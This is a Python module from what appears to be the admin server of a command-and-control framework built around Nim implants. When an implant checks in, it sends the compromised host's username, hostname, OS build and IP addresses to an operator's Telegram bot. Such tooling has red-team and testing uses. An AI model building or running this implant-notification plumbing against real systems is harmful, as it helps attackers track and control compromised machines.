import os
import urllib.parse
import requests
from src.servers.admin_api.models.nimplant_client_model import NimPlant

# This is a placeholder class for easy extensibility, more than anything
# You can easily add your own notification method below, and call it in the 'notify_user' function
# It will then be called when a new implant checks in, passing the Implant object (see nimhawk.py)


def notify_user(np: NimPlant):
    try:
        message = (
            "*A new Implant checked in!*\n\n"
            f"```\nUsername: {np.username}\n"
            f"Hostname: {np.hostname}\n"
            f"OS build: {np.os_build}\n"
            f"External IP: {np.ip_external}\n"
            f"Internal IP: {np.ip_internal}\n```"
        )

        if (
            os.getenv("TELEGRAM_CHAT_ID") is not None
            and os.getenv("TELEGRAM_BOT_TOKEN") is not None
        ):
            # Telegram notification
            notify_telegram(
                message, os.getenv("TELEGRAM_CHAT_ID"), os.getenv("TELEGRAM_BOT_TOKEN")
            )
        else:
            # No relevant environment variables set, do not notify
            pass
    except Exception as e:
        print(f"An exception occurred while trying to send a push notification: {e}")


def notify_telegram(message, telegram_chat_id, telegram_bot_token):
    message = urllib.parse.quote(message)
    notification_request = (
        "https://api.telegram.org/bot"
        + telegram_bot_token
        + "/sendMessage?chat_id="
        + telegram_chat_id
        + "&parse_mode=Markdown&text="
        + message
    )
    response = requests.get(notification_request)
    return response.json()
